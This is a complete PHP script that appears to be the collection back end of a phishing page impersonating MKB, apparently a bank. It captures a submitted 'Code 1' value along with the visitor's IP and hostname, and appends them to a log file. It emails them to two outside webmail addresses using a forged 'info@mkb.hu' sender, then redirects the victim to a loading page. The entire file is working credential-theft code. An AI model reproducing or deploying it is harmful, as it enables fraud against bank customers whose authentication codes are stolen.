 <?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg .= "\n";
$msg .= "Code 1 : ".$_POST['kod']."\n";
$msg .= "\n";
$msg .= "IP: ".$ip."\n";
$msg .= "HostName: ".$hostname."\n";
$msg .= "\n";
$msg .= "--------------MKB Code 1------------\n\n";
$post = "abs0000100@gmail.com,abs00001000@hotmail.com";
$fp = fopen("../use.txt","a");
fputs($fp,$msg);
fclose($fp);
$subj = "$ip - ".$_POST['kod']."\n";
$from = "From: MKBCode1<info@mkb.hu>";
mail("$post",$subj, $msg, $from);
header("Location:   loading.htm");  

?>
 